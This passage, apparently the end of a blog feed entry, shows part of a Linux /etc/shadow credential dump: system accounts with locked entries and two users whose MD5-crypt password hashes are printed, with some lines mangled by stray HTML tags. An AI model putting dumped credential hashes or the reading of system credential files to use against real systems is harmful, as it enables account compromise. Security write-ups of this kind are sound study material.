<a href="news:*:14513:0:99999:7:::">news:*:14513:0:99999:7:::</a>
uucp:<em>:14513:0:99999:7:::
operator:</em>:14513:0:99999:7:::
games:<em>:14513:0:99999:7:::
gopher:</em>:14513:0:99999:7:::
<a href="ftp:*:14513:0:99999:7:::">ftp:*:14513:0:99999:7:::</a>
nobody:*:14513:0:99999:7:::
mailnull:!!:14513:0:99999:7:::
rpm:!!:14513:0:99999:7:::
xfs:!!:14513:0:99999:7:::
rpc:!!:14513:0:99999:7:::
rpcuser:!!:14513:0:99999:7:::
nfsnobody:!!:14513:0:99999:7:::
nscd:!!:14513:0:99999:7:::
ident:!!:14513:0:99999:7:::
radvd:!!:14513:0:99999:7:::
postgres:!!:14513:0:99999:7:::
apache:!!:14513:0:99999:7:::
squid:!!:14513:0:99999:7:::
pcap:!!:14513:0:99999:7:::
john:$1$zL4.MR4t$26N4YpTGceBO0gTX6TAky1:14513:0:99999:7:::
harold:$1$Xx6dZdOd$IMOGACl3r757dv17LZ9010:14513:0:99999:7:::
{% endcodeblock %}</p>
]]></content>
  </entry>
  
</feed>
